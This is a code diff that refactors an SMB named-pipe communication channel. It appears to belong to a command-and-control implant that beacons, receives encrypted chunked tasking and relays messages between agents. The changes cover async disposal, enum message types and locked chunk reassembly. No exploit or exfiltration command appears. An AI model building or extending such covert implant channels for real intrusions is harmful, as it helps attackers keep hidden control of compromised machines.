@@ -14,7 +14,7 @@ using H.Pipes.Args;
 
 namespace Workflow.Channels
 {
-    public class SmbProfile : IChannel, IDisposable
+    public class SmbProfile : IChannel, IAsyncDisposable
     {
         private IServiceConfig agentConfig { get; set; }
         private ISecurityProvider crypt { get; set; }
@@ -33,8 +33,6 @@ namespace Workflow.Channels
             new ManualResetEventSlim(false);
         private ManualResetEventSlim clientConnected =
             new ManualResetEventSlim(false);
-        private SemaphoreSlim responsesReady =
-            new SemaphoreSlim(0);
         public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;
         private CheckinResponse cir;
 
@@ -120,16 +118,18 @@ namespace Workflow.Channels
 
         public async Task StartBeacon()
         {
+            var oldCts = this.cancellationTokenSource;
             this.cancellationTokenSource = new CancellationTokenSource();
+            oldCts.Dispose();
+
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
                 if (!this.messageManager.HasResponses())
                 {
                     try
                     {
-                        await responsesReady.WaitAsync(
-                            TimeSpan.FromMilliseconds(500),
-                            cancellationTokenSource.Token);
+                        await Task.Delay(
+                            500, cancellationTokenSource.Token);
                     }
                     catch (OperationCanceledException)
                     {
@@ -178,7 +178,8 @@ namespace Workflow.Channels
             DebugLog.Log(
                 $"SMB Send ({json.Length} chars before encryption)");
             json = this.crypt.Encrypt(json);
-            List<string> parts = json.SplitByLength(this.chunkSize).ToList();
+            List<string> parts =
+                json.SplitByLength(this.chunkSize).ToList();
             DebugLog.Log($"SMB Send chunking into {parts.Count} parts");
 
             string messageGuid = Guid.NewGuid().ToString();
@@ -188,7 +189,7 @@ namespace Workflow.Channels
                 {
                     guid = messageGuid,
                     final = (i == parts.Count - 1),
-                    message_type = "chunked_message",
+                    message_type = SmbMessageType.Chunked,
                     agent_guid = agentConfig.uuid,
                     delegate_message = parts[i],
                     sequence = i,
@@ -210,7 +211,7 @@ namespace Workflow.Channels
             SmbMessage sm = new SmbMessage()
             {
                 guid = Guid.NewGuid().ToString(),
-                message_type = "success",
+                message_type = SmbMessageType.Success,
                 final = true,
                 delegate_message = String.Empty,
                 agent_guid = agentConfig.uuid,
@@ -228,25 +229,37 @@ namespace Workflow.Channels
                 DebugLog.Log(
                     $"SMB message received, type: " +
                     $"{args.Message.message_type}");
-                if (args.Message.message_type == "success")
+                if (args.Message.message_type == SmbMessageType.Success)
                 {
                     return;
                 }
 
                 string guid = args.Message.guid;
-                this.partialMessages.TryAdd(guid, new StringBuilder());
-                int expected = this.expectedSequence.GetOrAdd(guid, 0);
 
-                if (args.Message.sequence != expected)
+                lock (disconnectLock)
                 {
-                    DebugLog.Log(
-                        $"SMB chunk out of order for {guid}: " +
-                        $"expected {expected}, got {args.Message.sequence}");
+                    this.partialMessages.TryAdd(
+                        guid, new StringBuilder());
+                    int expected =
+                        this.expectedSequence.GetOrAdd(guid, 0);
+
+                    if (args.Message.sequence != expected)
+                    {
+                        DebugLog.Log(
+                            $"SMB chunk out of order for {guid}: " +
+                            $"expected {expected}, " +
+                            $"got {args.Message.sequence}. " +
+                            $"Discarding message.");
+                        this.partialMessages.TryRemove(guid, out _);
+                        this.expectedSequence.TryRemove(guid, out _);
+                        return;
+                    }
+
+                    this.expectedSequence[guid] = expected + 1;
+                    this.partialMessages[guid].Append(
+                        args.Message.delegate_message);
                 }
 
-                this.expectedSequence[guid] = expected + 1;
-                this.partialMessages[guid].Append(
-                    args.Message.delegate_message);
                 DebugLog.Log(
                     $"SMB partial message tracked for {guid}, " +
                     $"seq: {args.Message.sequence}, " +
@@ -276,7 +289,8 @@ namespace Workflow.Channels
             }
             catch (Exception e)
             {
-                DebugLog.Log($"SMB OnMessageReceive error: {e.Message}");
+                DebugLog.Log(
+                    $"SMB OnMessageReceive error: {e.Message}");
             }
         }
 
@@ -313,7 +327,8 @@ namespace Workflow.Channels
 
             GetTaskingResponse gtr = JsonSerializer.Deserialize(
                 this.crypt.Decrypt(message),
-                GetTaskingResponseJsonContext.Default.GetTaskingResponse);
+                GetTaskingResponseJsonContext.Default
+                    .GetTaskingResponse);
             if (gtr == null)
             {
                 return;
@@ -328,7 +343,7 @@ namespace Workflow.Channels
             {
                 guid = Guid.NewGuid().ToString(),
                 final = true,
-                message_type = "success",
+                message_type = SmbMessageType.Success,
                 delegate_message = "",
                 agent_guid = this.agentConfig.uuid,
                 sequence = 0,
@@ -337,7 +352,7 @@ namespace Workflow.Channels
             await this.serverPipe.WriteAsync(sm);
         }
 
-        public void Dispose()
+        public async ValueTask DisposeAsync()
         {
             if (disposed) return;
             disposed = true;
@@ -346,8 +361,10 @@ namespace Workflow.Channels
             cancellationTokenSource.Dispose();
             checkinAvailable.Dispose();
             clientConnected.Dispose();
-            responsesReady.Dispose();
-            serverPipe?.DisposeAsync().AsTask().GetAwaiter().GetResult();
+            if (serverPipe != null)
+            {
+                await serverPipe.DisposeAsync();
+            }
         }
     }
 }
